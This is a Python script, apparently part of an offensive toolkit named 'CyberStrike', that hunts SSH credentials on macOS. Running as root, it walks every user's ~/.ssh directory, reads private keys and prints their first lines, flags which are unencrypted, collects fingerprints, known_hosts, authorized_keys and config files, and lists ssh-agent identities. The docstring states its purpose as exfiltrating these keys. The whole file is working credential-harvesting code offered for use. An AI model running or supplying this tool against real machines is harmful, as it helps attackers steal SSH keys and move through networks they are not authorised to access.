#!/usr/bin/env python3
"""
ssh_keys.py — Find and exfiltrate SSH private keys for all users on macOS.

Walks ~/.ssh/ directories, identifies key types, checks encryption status,
retrieves fingerprints, and checks the SSH agent for loaded identities.

Requires: root for accessing other users' directories.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path


KEY_FILES = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "id_xmss"]
OTHER_FILES = ["known_hosts", "authorized_keys", "config"]


class SshKeyFinder:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True

    def check_root(self):
        if os.geteuid() != 0:
            print("WARNING: Running without root — can only access current user's keys.", file=sys.stderr)

    def print_banner(self):
        print("=" * 60)
        print("CyberStrike — SSH Key Finder (macOS)")
        print("=" * 60)
        print(f"PID:     {os.getpid()}")
        print(f"User:    {self.args.user or 'all'}")
        print(f"Output:  {'JSON' if self.args.json_output else 'text'}")
        print(f"Started: {datetime.now().isoformat()}")
        print("=" * 60)
        print()

    def signal_handler(self, signum, frame):
        self.running = False

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            enc_marker = "[ENC]" if record.get("encrypted") else "[CLR]"
            print(f"{enc_marker} {record['user']:<15} {record['path']:<50} "
                  f"type={record.get('key_type', 'N/A'):<10} "
                  f"fp={record.get('fingerprint', 'N/A')}", flush=True)

    def get_users(self):
        """Get list of users to scan."""
        if self.args.user:
            return [self.args.user]
        users = []
        users_dir = Path("/Users")
        if users_dir.exists():
            for entry in users_dir.iterdir():
                if entry.is_dir() and not entry.name.startswith(".") and entry.name != "Shared":
                    users.append(entry.name)
        return sorted(users)

    def get_fingerprint(self, key_path):
        """Get SSH key fingerprint via ssh-keygen."""
        try:
            result = subprocess.run(
                ["ssh-keygen", "-lf", str(key_path)],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass
        return None

    def is_encrypted(self, content):
        """Check if a PEM-encoded key is encrypted."""
        return "ENCRYPTED" in content

    def detect_key_type(self, content, filename):
        """Detect key type from content or filename."""
        if "id_rsa" in filename or "RSA" in content:
            return "rsa"
        if "id_ed25519" in filename or "ED25519" in content:
            return "ed25519"
        if "id_ecdsa" in filename or "EC" in content:
            return "ecdsa"
        if "id_dsa" in filename or "DSA" in content:
            return "dsa"
        if "id_xmss" in filename:
            return "xmss"
        return "unknown"

    def scan_user(self, username):
        """Scan a user's .ssh directory."""
        ssh_dir = Path(f"/Users/{username}/.ssh")
        if not ssh_dir.exists():
            return

        for key_file in KEY_FILES:
            if not self.running:
                return
            key_path = ssh_dir / key_file
            if not key_path.exists():
                continue

            try:
                content = key_path.read_text(errors="replace")
                lines = content.splitlines()
                preview = "\n".join(lines[:2]) if lines else ""
                stat = key_path.stat()

                fingerprint_raw = self.get_fingerprint(key_path)
                fingerprint = fingerprint_raw.split(" ")[1] if fingerprint_raw and " " in fingerprint_raw else fingerprint_raw

                self.emit({
                    "timestamp": datetime.now().isoformat(),
                    "user": username,
                    "path": str(key_path),
                    "filename": key_file,
                    "key_type": self.detect_key_type(content, key_file),
                    "encrypted": self.is_encrypted(content),
                    "fingerprint": fingerprint or "",
                    "permissions": oct(stat.st_mode)[-3:],
                    "size_bytes": stat.st_size,
                    "preview": preview,
                    "file_type": "private_key",
                })

                pub_path = ssh_dir / f"{key_file}.pub"
                if pub_path.exists():
                    pub_content = pub_path.read_text(errors="replace").strip()
                    self.emit({
                        "timestamp": datetime.now().isoformat(),
                        "user": username,
                        "path": str(pub_path),
                        "filename": f"{key_file}.pub",
                        "key_type": self.detect_key_type(pub_content, key_file),
                        "encrypted": False,
                        "fingerprint": fingerprint or "",
                        "permissions": oct(pub_path.stat().st_mode)[-3:],
                        "size_bytes": pub_path.stat().st_size,
                        "preview": pub_content[:120],
                        "file_type": "public_key",
                    })
            except PermissionError:
                if not self.args.json_output:
                    print(f"[!] Permission denied: {key_path}", flush=True)
            except Exception as e:
                if not self.args.json_output:
                    print(f"[!] Error reading {key_path}: {e}", flush=True)

        for other_file in OTHER_FILES:
            if not self.running:
                return
            file_path = ssh_dir / other_file
            if not file_path.exists():
                continue
            try:
                stat = file_path.stat()
                content = file_path.read_text(errors="replace")
                line_count = len(content.splitlines())
                self.emit({
                    "timestamp": datetime.now().isoformat(),
                    "user": username,
                    "path": str(file_path),
                    "filename": other_file,
                    "key_type": "",
                    "encrypted": False,
                    "fingerprint": "",
                    "permissions": oct(stat.st_mode)[-3:],
                    "size_bytes": stat.st_size,
                    "preview": f"{line_count} lines",
                    "file_type": other_file.replace("_", "-"),
                })
            except (PermissionError, Exception):
                pass

    def check_ssh_agent(self):
        """Check SSH agent for loaded identities."""
        try:
            result = subprocess.run(["ssh-add", "-l"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                for line in result.stdout.strip().splitlines():
                    self.emit({
                        "timestamp": datetime.now().isoformat(),
                        "user": os.environ.get("USER", "unknown"),
                        "path": "ssh-agent",
                        "filename": "agent-identity",
                        "key_type": "",
                        "encrypted": False,
                        "fingerprint": line.split(" ")[1] if " " in line else line,
                        "permissions": "",
                        "size_bytes": 0,
                        "preview": line,
                        "file_type": "agent_identity",
                    })
        except Exception:
            pass

    def run(self):
        self.check_root()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        users = self.get_users()
        for user in users:
            if not self.running:
                break
            self.scan_user(user)

        if self.running:
            self.check_ssh_agent()

        self.cleanup()

    def cleanup(self):
        print(f"\n--- ssh_keys summary ---")
        print(f"Items found: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Find and enumerate SSH keys for all users on macOS.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 ssh_keys.py\n"
            "  sudo python3 ssh_keys.py --user admin --json-output\n"
            "  sudo python3 ssh_keys.py --json-output | jq 'select(.encrypted == false)'\n"
        ),
    )
    parser.add_argument("--user", type=str, default=None, help="Scan specific user only")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    finder = SshKeyFinder(args)
    finder.run()


if __name__ == "__main__":
    main()
